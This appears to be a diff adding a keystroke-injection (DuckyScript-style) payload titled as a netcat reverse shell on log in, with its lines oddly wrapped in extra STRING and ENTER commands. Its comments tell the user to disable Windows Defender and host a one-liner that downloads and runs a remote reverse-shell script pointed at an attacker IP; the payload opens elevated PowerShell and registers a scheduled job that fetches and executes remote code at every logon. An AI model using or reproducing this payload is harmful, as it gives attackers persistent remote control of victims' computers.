@@ -1,0 +1,57 @@
+REM 
+STRING REM Title: Netcat Reverseshell On Log In
+ENTER
+STRING REM Description: Creates a powershell Job/Task to remotely connect to the computer with netcat every time user logs in
+ENTER
+STRING REM Author: https://github.com/HokkaidoInu
+ENTER
+STRING REM delay: You may want to change the delays and/or delete some, I have it like it is because I have really slow computer
+ENTER
+STRING REM setup: 
+ENTER
+STRING REM Windows defender is required to be disabled
+ENTER
+STRING REM Have IP and port 87 open and listening on server side for netcat reverse shell
+ENTER
+STRING REM Create a txt file with the command below in it, replacing the ip to your servers ip:
+ENTER
+STRING REM IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 123.456.7.890 87
+ENTER
+STRING REM Host the text file online on github or your own web server or something
+ENTER
+STRING REM Then in the payload, replace https://example.com/txt/load.txt with the url that you are hosting your txt file in raw format
+ENTER
+STRING GUI r
+ENTER
+STRING DELAY 4000
+ENTER
+STRING STRING powershell
+ENTER
+STRING CTRL SHIFT ENTER
+ENTER
+STRING DELAY 4000
+ENTER
+STRING LEFT
+ENTER
+STRING DELAY 4000
+ENTER
+STRING ENTER
+ENTER
+STRING DELAY 4000
+ENTER
+STRING STRING $T = New-JobTrigger -AtLogOn ; $Script = Invoke-WebRequest 'https://example.com/txt/load.txt' ; $ScriptBlock = [Scriptblock]::Create($Script.Content) ; Register-ScheduledJob -Name "Powershell" -ScriptBlock $ScriptBlock -Trigger $T
+ENTER
+STRING DELAY 4000
+ENTER
+STRING ENTER
+ENTER
+STRING DELAY 8000
+ENTER
+STRING STRING exit
+ENTER
+STRING DELAY 4000
+ENTER
+STRING ENTER
+ENTER
+ENTER
+ENTER
